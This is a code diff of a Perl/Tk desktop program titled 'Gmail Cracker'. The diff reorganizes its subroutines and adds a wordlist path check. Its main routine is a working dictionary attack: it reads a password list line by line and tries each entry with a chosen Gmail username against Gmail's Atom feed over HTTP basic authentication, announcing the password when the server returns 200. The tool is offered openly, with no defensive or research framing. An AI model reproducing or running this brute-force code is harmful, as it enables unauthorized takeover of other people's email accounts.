@@ -1,24 +1,23 @@
 #!/usr/bin/perl
 
-use strict;
+#use strict;
 use warnings;
 
 use Tk;
 use WWW::Curl::Easy;
+use IO::Pipe;
 
 require Tk::Table;
 require Tk::FileSelect;
 
-$| = 1;
+my($UserName, $Password, $Site, $CurlReturn, $File, $Pane, $ARG,
+	$ResponseCode, $Curl, $Path, $UserEntryText, $LogFile, $Yada );
 
-my($UserName, $Password, $Site, $CurlReturn, $File, $Pane,
-	$ResponseCode, $Curl, $Path, $UserEntryText );
-
-my(@Curl);
+my(@ARG, @Curl, @LogFile);
 
 my $MainWindow = MainWindow->new;
 	$MainWindow->title( 'Gmail Cracker' );
-	$MainWindow->geometry( '600x400' );
+	$MainWindow->geometry( '600x400+50+50' );
 
 my $Table = $MainWindow->Table( -rows => 10,
 				-columns => 10,
@@ -63,23 +62,132 @@ my $ConnectButton = $Table->Button( -text => "Start Crackn", -command => \&Crack
 ## PACK TABLE AS SEPERATE CALL. CANNOT PACK DIRECTLT WITH WIDGET OR IT WILL FAIL.
 $Table->pack();
 
+MainLoop;
 
-sub waiting {
+sub choose_dir {
+			
+my $FileSelector = $MainWindow->FileSelect( -directory => '/' );
 
-	$Pane->insert("end", "Cracking. Please wait.");
+	$File = $FileSelector->Show; 
+
+	if($File) {
+	
+		$Pane->insert("end", "\nDictionary Path => $File\n");
+	
+		$ListEntry->insert("end", $File);
+
+	}
+
+		else {
+
+			print "\nFALSE\n";
+
+		}
+
+	## THIS LINE AND THE ONE UNDER SETS THE FILE NAME EXCLUDING THE PATH TO THE $PATHFILE VARIABLE
+	
+};
+
+sub Crackn { 
+
+$Yada = $ListEntry->get;
+
+	if( $Yada eq '' ) {
+
+		print "File not selected\n";
+
+		$Pane->insert("end", "\nFile not selected.\n");
+
+	}
+
+		elsif( ! $File ) {
+
+			$File = $Yada;
+
+			if( &path_check ) {
+
+				$Pane->insert("end", "\nDictionary Path => $File\n");
+
+			}
+
+		}
+
+
+
+$UserName = $UserEntry->get;
+
+$Pane->insert("end", "\nGmail User Name => $UserName\n");
+$MainWindow->update;
+
+$Pane->insert("end", "\n\nCracking, please wait.\n\n");
+$MainWindow->update;
+
+open(FILE, '<', $File) or die "Cannot open $File: $!\n";
+
+        $Site = 'https://mail.google.com/mail/feed/atom';
+
+        $Curl = WWW::Curl::Easy->new;
+
+while(<FILE>) {
+
+	#last unless defined $_;
+
+        $Curl->setopt(CURLOPT_TIMEOUT, 20);
+
+        $Curl->setopt(CURLOPT_CONNECTTIMEOUT, 15);
+
+        $Curl->setopt(CURLOPT_VERBOSE, 1);
+
+        #$Curl->setopt(CURLOPT_HEADER, 1);
+
+        $Curl->setopt(CURLOPT_USERPWD, "$UserName:$_");
+
+        $Curl->setopt(CURLOPT_URL, $Site);
+ 
+        $CurlReturn = $Curl->perform;
+
+        $ResponseCode = $Curl->getinfo(CURLINFO_HTTP_CODE);
+
+        if( $ResponseCode == 200 ) {
+
+		$Pane->insert("end", "\nPASSWORD WAS => $_\n");
+
+                print "\n\nPASSWORD WAS $_\n\n";
+
+                return;
+
+        }
+
+                else {
+
+                	print "\n\nPASSWORD WAS NOT $_\n\n";
+
+                }
+
+ }
 
 }
 
-sub choose_dir {
+sub warning {
+my $Tlw = $MainWindow->Toplevel;
+	$Tlw->geometry("260x100+50+50");
+	$Tlw->title('Warning');
 
-my $FileSelector = $MainWindow->FileSelect( -directory => '/' );
+my $Label = $Tlw->Label( -text => "This is not a .list file. Please \nchose a file with the .list extension." )->pack( -side => 'top', 
+		-pady => '15' );
 
-	$File = $FileSelector->Show;
+	$Tlw->Button( -text => "OK",
+			-command => sub { $Tlw->withdraw }, )->pack( -side => 'bottom', 
+					-anchor => 'se', 
+					-padx => '5', 
+					-pady => '5' );
+};
 
-	## THIS LINE AND THE ONE UNDER SETS THE FILE NAME EXCLUDING THE PATH TO THE $PATHFILE VARIABLE
-        if( $File =~ m/\/[a-zA-Z0-9].*\/+/i ) {
+sub path_check {
+
+if( $File =~ m/\/[a-zA-Z0-9].*\/+/i ) {
  
-                        my $PathFile = $';
+                my $PathFile = $';
 
 		## CHECKS TO SEE IF FILE ENDS WITH .LIST EXTENSION.
                 if( $PathFile =~ m/[a-zA-Z0-9]*\.list/i ) {
@@ -104,73 +212,4 @@ my $FileSelector = $MainWindow->FileSelect( -directory => '/' );
 
         }	
 
-};
-
-sub Crackn { 
-
-$UserName = $UserEntry->get;
-
-$Pane->insert("end", "Gmail User Name => $UserName\n");
-
-open(FILE, '<', $File) or die "Cannot open $File: $!\n";
-
-        $Site = 'https://mail.google.com/mail/feed/atom';
-
-        $Curl = WWW::Curl::Easy->new;
-
-while(<FILE>) {
-
-        $Curl->setopt(CURLOPT_TIMEOUT, 20);
-
-        $Curl->setopt(CURLOPT_CONNECTTIMEOUT, 15);
-
-        $Curl->setopt(CURLOPT_VERBOSE, 1);
-
-        #$Curl->setopt(CURLOPT_HEADER, 1);
-
-        $Curl->setopt(CURLOPT_USERPWD, "$UserName:$_");
-
-        $Curl->setopt(CURLOPT_URL, $Site);
- 
-        $CurlReturn = $Curl->perform;
-
-        $ResponseCode = $Curl->getinfo(CURLINFO_HTTP_CODE);
-
-        if( $ResponseCode == 200 ) {
-
-		$Pane->insert("end", "PASSWORD WAS => $_\n");
-
-                print "\n\nPASSWORD WAS $_\n\n";
-
-		select(undef, undef, undef, .1);
-
-                return;
-
-        }
-
-                else {
-
-                        print "\n\nPASSWORD WAS NOT $_\n\n";
-
-                }
-
- }
-
 }
-
-sub warning {
-my $Tlw = $MainWindow->Toplevel;
-	$Tlw->geometry("260x100+50+50");
-	$Tlw->title('Warning');
-
-my $Label = $Tlw->Label( -text => "This is not a .list file. Please \nchose a file with the .list extension." )->pack( -side => 'top', 
-		-pady => '15' );
-
-	$Tlw->Button( -text => "OK",
-			-command => sub { $Tlw->withdraw }, )->pack( -side => 'bottom', 
-					-anchor => 'se', 
-					-padx => '5', 
-					-pady => '5' );
-};
-
-MainLoop;
